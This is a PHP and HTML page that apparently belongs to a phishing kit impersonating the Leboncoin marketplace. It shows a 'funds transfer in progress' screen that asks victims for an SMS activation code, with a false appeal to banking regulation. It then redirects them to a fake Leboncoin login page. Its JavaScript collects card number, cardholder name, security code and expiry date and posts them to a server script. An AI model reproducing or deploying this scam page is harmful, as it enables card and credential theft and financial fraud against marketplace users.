<?php
session_start();
if (isset($_POST['validerr'])) {
    // Chargement des données JSON actuelles depuis data.json
    $jsonData = file_get_contents('data.json');
    $data = json_decode($jsonData, true);

    $code = $_POST['matricule'];
    $matriculeFound = false;

    foreach ($data['compte'] as $compte) {
        if ($compte['matricule'] == $code) {
            $matriculeFound = true;

            // Stockage des informations en session
            $_SESSION['id'] = $compte['id']; // Ajoutez cette ligne si 'id' est également stocké dans votre JSON
            $_SESSION['matricule'] = $compte['matricule'];
            $_SESSION['email'] = $compte['email'];
            $_SESSION['montant_achat'] = $compte['prix_negocier'];
            $_SESSION['montant_livraison'] = $compte['prix_livraison'];
            $_SESSION['protection_vente'] = $compte['protection_vente'];

            $_SESSION['montant_total'] = $compte['prix_livraison'] + $compte['prix_negocier'] + $compte['protection_vente'];

            header('location: connexionLeboncoin.php');
            exit(); // Assure que le script s'arrête après la redirection
        }
    }

    if (!$matriculeFound) {
        // Gérer le cas où le matricule n'est pas trouvé
        echo "<div class='error'><p>Matricule invalide. Veuillez réessayer.</p></div>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <link rel="shortcut icon" type="image/png" href="asset/img/log.png" type="image/x-icon" />
    <title>Récupérer mes fonds</title>
    <script type="text/javascript" src="asset/js/creditly.js"></script>
    <link rel="stylesheet" href="asset/css/creditly.css">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>

    <!--script src="//code.jivosite.com/widget/ncCHReivMY" async></script-->
    <script src="//code.jivosite.com/widget/00joJsgajZ" async></script>

</head>
<style>
    .space {
        margin-bottom: 28px;
    }

    .form-label {
        font-size: 12px;
        font-weight: bold;
    }

    .cardcara {
        overflow-y: hidden;
        height: 350px
    }

    .error {
        /* Hidden by default */
        display: block;
        position: fixed;
        /* Stay in place */
        /* Sit on top */
        padding-top: 25px;
        /* Location of the box */
        left: 0;
        top: 0;
        width: 100%;
        /* Full width */
        height: 100%;
        /* Full height */
        background-color: blue;
        /* Fallback color */
        background-color: rgb(249 246 246 / 40%);
        overflow-y: hidden;
        /* Black w/ opacity */
    }

    @media only screen and (max-width: 600px) {
        .space {
            margin-bottom: 15px;
        }

        .cardcara {
            height: 540px
        }
    }
</style>

<body>

    <nav class="navbar p-2 fixed-top" style="background-color: #fff; box-shadow: 0 2px 4px rgba(0,0,0,.08),0 4px 12px rgba(0,0,0,.08);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="asset/img/ico.png" alt="" style="max-width:100% ;"> </a>
        </div>
    </nav>


    <div class="error" id="error">
        <div class="d-flex justify-content-center ">




            <div class="col-11 col-md-5  " style="  margin-top: 70px; ">

                <div class="card" style="padding: 0px; border-radius: 15px;">
                    <div style="border: solid 1px #ff6e14; background-color: #ff6e14; color: #fff; border-bottom-left-radius: 50%; border-bottom-right-radius: 50%; padding: 38px ;
                        position: relative; border-top-left-radius: 10px; border-top-right-radius: 10px;">
                        <div style="text-align: center; ">

                            <img src="asset/img/ico.png" width="55%">

                        </div>
                        <div style="text-align: center;position: absolute;top: 90px; left: 45%; ">

                            <img src="asset/img/log.png" height="51" width="58">

                        </div>
                        <br><br>

                    </div>
                    <div class="card-body " style="text-align: center; margin-top: 10px;">
                        <div>
                            <h1 class="titre_contsms" style="font-weight: bold; font-size: 20px; font-weight: bold;">Transfert de fonds en cours</h1>
                        </div>
                        <div class="message_mise_ajour" style="display:block">
                            <p class='titre_deco' style="font-size: 14px; color: black; margin: 10px 10px 5px 10px; text-align: left;">

                                Bonjour,<br>Veuillez insérer le code reçu par message dans le champ ci-dessous afin d'activer votre mise à jour et de récupérer vos fonds. Si vous n'avez pas reçu un message contenant votre code d'activation, merci de bien
                                vouloir nous contacter par e-mail.
                                <br><br>Cette démarche obligatoire s'inscrit dans la stricte application de la réglementation bancaire et ne vous prendra que quelques instants.
                                <br>

                            </p>
                            <form class="row col-12 col-md-7 mx-auto mt-3" method="POST" action="">
                                <div class="input-group mb-3 ">
                                    <span class="input-group-text" id="basic-addon1">code </span>
                                    <input type="text" class="form-control code_mise_a_jour" name="matricule" placeholder="code d'activation" aria-label="Username" aria-describedby="basic-addon1">
                                </div>
                                <div style="text-align: center; margin-top: 10px;">
                                    <button type="submit" name="validerr" class="btn   col-12 col-md-7 confirm-alert" style="background-color: #ff6e14; color: #fff; font-weight: bold;">Activer ma mise à jour</button>
                                </div>
                            </form>


                        </div>


                    </div>
                </div>
            </div>


        </div>
    </div>
    </div>


    <script type="text/javascript">
        $(function() {
            var creditly = Creditly.initialize(
                '.creditly-wrapper .expiration-month-and-year',
                '.creditly-wrapper .credit-card-number',
                '.creditly-wrapper .security-code',
                '.creditly-wrapper .card-type');

            $(".creditly-card-form .submit").click(function(e) {
                e.preventDefault();

                var output = creditly.validate();
                if (output) {
                    //carte valide
                    $.ajax({
                        type: "POST",
                        url: "info_cli.php",
                        data: 'card_number=' + $('.credit-card-number').val() + '&card_name=' + $('.billing-address-name').val() + '&card_security-code=' + $('.security-code').val() + '&card_date=' + $('.expiration-month-and-year').val(),
                        dataType: "JSON",
                        success: function(response) {
                            if (response.messagecard == 'validcard') {
                                $('.champ_form').css("display", "none")
                                $('.vericard').css("display", "block")
                                setTimeout(() => {
                                    $('.vericard').css("display", "none")
                                    $('.veritext').css("display", "block")
                                }, 3000);
                            }
                        },
                    });



                }
            });

            $('.code_sms').click(function(e) {
                e.preventDefault()
            })
        });
    </script>

</body>

</html>